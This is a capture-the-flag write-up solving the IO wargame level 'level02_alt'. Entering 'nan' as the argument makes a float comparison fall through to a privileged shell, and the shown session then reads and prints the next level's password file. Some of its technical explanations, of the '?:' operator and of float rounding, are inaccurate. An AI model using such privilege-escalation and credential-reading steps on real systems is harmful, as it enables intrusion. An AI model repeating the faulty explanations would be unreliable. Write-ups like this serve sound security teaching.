Let's take a look at the source code.

```
/* submitted by noname */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


#define answer 3.141593

void main(int argc, char **argv) {

	float a = (argc - 2)?: strtod(argv[1], 0);

        printf("You provided the number %f which is too ", a);


        if(a < answer)
                 puts("low");
        else if(a > answer)
                puts("high");
        else
                execl("/bin/sh", "sh", "-p", NULL);
}
```

A couple of things about this code, first let's take a look at this line.

```
	float a = (argc - 2)?: strtod(argv[1], 0);
```

Will when I first started this challenge, I didn't know what the "?:" meant. After a bit of googling I found out that it is a ternary operator, which is essentially an if then statement. The part before the "?" is the condition. The part in between the "?" and the ":" is what executes if the condition is true. After the ":" is what happens when the condition is false.
So if the value is true, since there is nothing in the truth location, it will just be equal to the amount of arguments (argc) minus 2. If it is false, then it will just be equivalent to the float equivalent (thanks to the strtod() function) of the first argument after the program name.
To get it to evaluate as false, we can just enter in the program name followed by another argument, since it will evaluate a zero as false.

```
        if(a < answer)
                 puts("low");
        else if(a > answer)
                puts("high");
        else
                execl("/bin/sh", "sh", "-p", NULL);
```

Looking here, it appears that our input which is stored in the float "a" will be evaluated if it is higher or lower than the answer variable (3.141593). So we should be able just to input the value, then boom a shell.

```
level2@io:/levels$ ./level02_alt 3.141593
You provided the number 3.141593 which is too low
```

What, that should of worked? But wait a minute, our input is being stored as a float. The issue with floats is when they are compared with other things, they are rounded in this case down. That is why it is printing that we have the same value it is checking against however it is claiming that the value we gave it is lower. So no matter what value we put in there, it is going to get rounded (provided it can) and it will loose the decimal places needed to fail both of those checks.
However there is also something special about floats. It is possible for a float to have the value nan(not a number). If it is not a number than it can neither be greater or less than 3.141593 since it isn't a number. To prove this concept, I played around with a bit of sample code myself.

Sample Code:
```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    //Establish the int and the float
    int a;
    float f;
    
    //Set the value of the int
    a = 4;
    
    //Divide a number by zero, which doesn't exist so it becomes not a number
    f = 0.0 / 0.0;

    //Print the value of that number
    printf("%f\n", f);
    
    //And finally to evaluate it
    if (a < f)
        puts("This won't work");
    if (a > f)
        puts("This won't work");
    else
        puts("This will work");
    return 0;
}
```

and here is the output:
```
guyinatuxedo@tux:/Athena/test/bin/Debug$ ./test 
-nan
This will work
```

So now that we proved that worked, we should be able to do the same thing to the challenge. To set the float equal to nan (not a number), we can just put "nan" as the argument.

```
level2@io:/levels$ ./level02_alt nan
sh-4.3$ whoami
level3
sh-4.3$ cat /home/level3/.pass
OlhCmdZKbuzqngfz
```
And just like that, we pwned the challenge.

